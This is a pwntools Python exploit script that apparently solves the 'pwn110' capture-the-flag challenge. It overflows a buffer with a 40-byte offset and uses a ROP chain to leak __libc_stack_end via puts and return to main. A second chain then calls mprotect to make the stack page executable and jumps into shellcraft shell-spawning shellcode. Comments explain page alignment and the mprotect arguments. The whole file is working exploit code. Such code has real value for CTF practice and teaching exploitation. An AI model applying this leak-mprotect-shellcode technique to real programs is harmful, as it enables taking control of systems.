

from pwn import *

elf = context.binary = ELF('./pwn110-1644300525386.pwn110', checksec=False)
context.log_level = 'debug'

io = process()

offset = 40

pop_rdi = 0x40191a


# We are attempting to leak a known address (__libc_stack_end) which points to the
# end of the stack

#__libc_stack_end is a variable from the ELF symbol table


payload = flat(
	b'A' * offset,
	pop_rdi,
	elf.sym['__libc_stack_end'],
	elf.sym['puts'],				# Leak using puts()
	elf.sym['main']
)

# call main() again for 2nd payload



io.sendlineafter(b'libc \xf0\x9f\x98\x8f', payload)
io.recvline()

stack_end_addr = unpack(io.recv(6).ljust(8,b'\x00'))
log.success(f'Stack End Address: {hex(stack_end_addr)}')



# This is for page alignment
# What is a page? => fixed-length contiguous block of virtual memory
#					each page has its own permissions (e.g., readable, writable, executable
#
#
#
# On x86_64, 1 page = 0x1000 bytes = 4096 bytes
# Pages usually start at addresses like: 0x7fffffffe000, 0x7fffffffD000, 0x7fffffffC000, etc...
#
#
# '& 0xfffffffffffff000' is a bitmask that zeros out the last 12 bits (3 zeros) on a 4KB (0x1000) 
# page boundary 
#
#
#
# The alignment rounds it down to the nearest page boundary


mprotect_address = stack_end_addr & 0xfffffffffffff000
log.success(f'mprotect() Address: {hex(mprotect_address)}')


pop_rsi = 0x40f4de
pop_rdx = 0x40181f
push_rsp = 0x41d989


# Sets up the arguments to call mprotect(), it takes 3 arguments
#
#
#
# mprotect(void addr[.len], size_t len, int prot)
# mprotect(mprotect_memory, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC)
#
#
#
# 1st argument: Address of mprotect()
# 2nd argument: Size of page (0x1000)
# 3rd argument: permissions(we put 7 for full permissions)
#
#
#
# After setting up, Call RSP (Push RSP gadget) and put shellcode


payload2 = flat(
	b'A' * offset,
	pop_rdi,
	mprotect_address,
	pop_rsi,
	0x1000,
	pop_rdx,
	0x7,
	elf.sym['__mprotect'],
	push_rsp,
	asm(shellcraft.sh())

)

io.clean()
io.sendline(payload2)
io.interactive()